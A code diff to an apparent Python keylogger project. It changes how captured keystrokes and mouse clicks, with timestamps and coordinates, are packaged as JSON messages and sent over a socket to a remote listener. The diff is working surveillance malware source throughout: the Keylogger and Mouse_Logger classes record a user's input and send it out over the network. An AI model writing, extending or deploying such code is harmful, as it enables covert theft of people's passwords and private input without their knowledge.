@@ -4,6 +4,7 @@ import threading
 from datetime import datetime
 from pynput.keyboard import Listener
 from pynput import mouse
+import json
 
 
 
@@ -44,12 +45,22 @@ class Keylogger():
         if self.n > 3:
             now = datetime.now()
             self.dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
-            SuperSocket(self.client_socket).send_msg((f"{self.dt_string}: long {format(key)}\n").encode())
+            message = {
+                "type": "logger",
+                "data": f"{self.dt_string}: long {format(key)}\n"
+            }
+            message_to_send = json.dumps(message)
+            SuperSocket(self.client_socket).send_msg((message_to_send).encode())
             self.n = 0
         else:
             now = datetime.now()
             self.dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
-            SuperSocket(self.client_socket).send_msg((f"{self.dt_string}: {format(key)}\n").encode())
+            message = {
+                "type": "logger",
+                "data": f"{self.dt_string}: {format(key)}\n"
+            }
+            message_to_send = json.dumps(message)
+            SuperSocket(self.client_socket).send_msg((message_to_send).encode())            
             self.n = 0
 
 class Mouse_Logger():
@@ -71,7 +82,12 @@ class Mouse_Logger():
                 
             now = datetime.now()
             self.dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
-            SuperSocket(self.client_socket).send_msg((f"{self.dt_string}: Mouse clicked at {button_name} ({x}, {y})\n").encode())
+            message = {
+                "type": "logger",
+                "data": f"{self.dt_string}: Mouse clicked at {button_name} ({x}, {y})\n"
+            }
+            message_to_send = json.dumps(message)
+            SuperSocket(self.client_socket).send_msg((message_to_send).encode())
 
 class SuperSocket():
     def __init__(self, current_socket):  # make the self.current_socket euqal to current_socket
